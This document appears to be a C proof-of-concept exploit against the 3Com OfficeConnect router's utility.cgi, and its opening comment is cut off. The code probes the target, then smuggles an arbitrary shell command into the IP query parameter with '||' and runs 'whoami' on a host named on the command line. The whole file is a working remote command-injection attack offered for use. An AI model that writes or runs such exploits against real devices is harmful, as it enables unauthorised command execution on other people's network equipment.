// "3Com OfficeConnect

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>

#define MAX_RESPONSE_SIZE 8192

int send_request(int sock, const char *request) {
    return send(sock, request, strlen(request), 0);
}

char *receive_response(int sock) {
    char *response = malloc(MAX_RESPONSE_SIZE);
    if (!response) {
        perror("Memory allocation failed");
        return NULL;
    }
    memset(response, 0, MAX_RESPONSE_SIZE);

    int bytes_received = recv(sock, response, MAX_RESPONSE_SIZE - 1, 0);
    if (bytes_received < 0) {
        perror("Receive failed");
        free(response);
        return NULL;
    }
    response[bytes_received] = '\0'; // Null-terminate the response
    return response;
}

int check_vulnerability(const char *target_ip, int port) {
    int sock;
    struct sockaddr_in server_addr;
    char request[256];

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return 0;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    inet_pton(AF_INET, target_ip, &server_addr.sin_addr);

    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection failed");
        close(sock);
        return 0;
    }

    snprintf(request, sizeof(request),
             "GET /utility.cgi?testType=1&IP=aaa HTTP/1.1\r\n"
             "Host: %s\r\n"
             "Connection: close\r\n\r\n",
             target_ip);

    send_request(sock, request);
    char *response = receive_response(sock);
    close(sock);

    if (response) {
        // Check if the response status is 200 OK
        if (strstr(response, "200 OK")) {
            free(response);
            return 1; // Target appears to be vulnerable
        }
        free(response);
    }
    return 0; // Target does not seem to be vulnerable
}

void execute_command(const char *target_ip, int port, const char *cmd) {
    int sock;
    struct sockaddr_in server_addr;
    char request[512];

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Socket creation failed");
        return;
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(port);
    inet_pton(AF_INET, target_ip, &server_addr.sin_addr);

    if (connect(sock, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("Connection failed");
        close(sock);
        return;
    }

    snprintf(request, sizeof(request),
             "GET /utility.cgi?testType=1&IP=aaa || %s HTTP/1.1\r\n"
             "Host: %s\r\n"
             "Connection: close\r\n\r\n",
             cmd, target_ip);

    send_request(sock, request);
    receive_response(sock); // We ignore the response
    close(sock);
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        printf("Usage: %s <target_ip> <port>\n", argv[0]);
        return 1;
    }

    const char *target_ip = argv[1];
    int port = atoi(argv[2]);

    check_vulnerability(target_ip, port);
    execute_command(target_ip, port, "whoami");

    return 0;
}
